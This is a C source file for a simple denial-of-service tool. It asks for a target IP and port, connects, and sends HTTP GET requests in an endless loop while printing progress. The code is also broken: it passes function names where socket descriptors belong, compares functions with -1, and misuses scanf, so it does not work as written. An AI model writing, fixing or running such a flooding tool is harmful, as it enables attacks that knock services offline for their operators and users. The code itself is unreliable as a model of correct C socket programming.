#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "cli_colors.h"
#include "Dos.h"


#define connection_failed -1

void dos_welcome()
{
    SEND_SUCCESS_bold("\n[+] Dos tool is successfully started.\n");
}

int make_socket()
{
    socket(AF_INET, SOCK_STREAM, 0); 
}

int connection_state(char ip[50], int port)
{
    struct sockaddr_in connection;
    connection.sin_family = AF_INET; 
    connection.sin_addr.s_addr = inet_addr(ip);
    connection.sin_port = htons(port);

    connect(make_socket, (struct sockaddr*) &connection, sizeof(connection));
}

void dos_executing(char ip[50], int port)
{
    connection_state(ip, port);

    if (connection_state == connection_failed) {
        SEND_ERROR_bold("[-] Connection failed.");
    } else {
        char packets[] = "GET / HTTP/1.1\r\n\r\n";

        printf("\n%s[+] Connected to %s", "\033[1;32m", ip);

        
	    while (connection_state != connection_failed) {
            send(make_socket, packets, sizeof(packets), 0);
            printf("\n%s[CONNECTION] SEND PACKETS TO \033[37m%s", "\033[1;33m", ip);
	    }

        if (connection_state == connection_failed) {
            SEND_SUCCESS_bold("[+] Connection closed.");
        }
    }
}


void dos_start()
{
    dos_welcome();

    char ip[50];
    int port;

    prinf_yellow_bold("[?] Type an ip: \033[37m");
    scanf("%s", &ip);

    prinf_yellow_bold("[?] Type a port: \033[37m");
    scanf("%d", &port);

    dos_executing(ip, port);
}